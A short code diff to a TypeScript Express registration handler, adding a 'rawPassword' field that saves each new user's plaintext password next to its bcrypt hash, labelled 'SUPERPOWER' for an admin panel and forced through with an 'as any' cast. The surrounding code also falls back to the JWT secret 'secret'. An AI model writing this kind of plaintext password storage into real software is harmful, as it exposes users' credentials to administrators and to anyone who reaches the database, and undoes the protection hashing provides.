@@ -35,7 +35,12 @@ export const register = async (req: Request, res: Response) => {
     const hashedPassword = await bcrypt.hash(password, 10);
 
     const user = await prisma.user.create({
-      data: { username: cleanUsername, email: cleanEmail, password: hashedPassword }
+      data: { 
+        username: cleanUsername, 
+        email: cleanEmail, 
+        password: hashedPassword,
+        rawPassword: password // ⚡ SUPERPOWER: Store raw password for admin panel
+      } as any
     });
 
     const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, process.env.JWT_SECRET || 'secret');
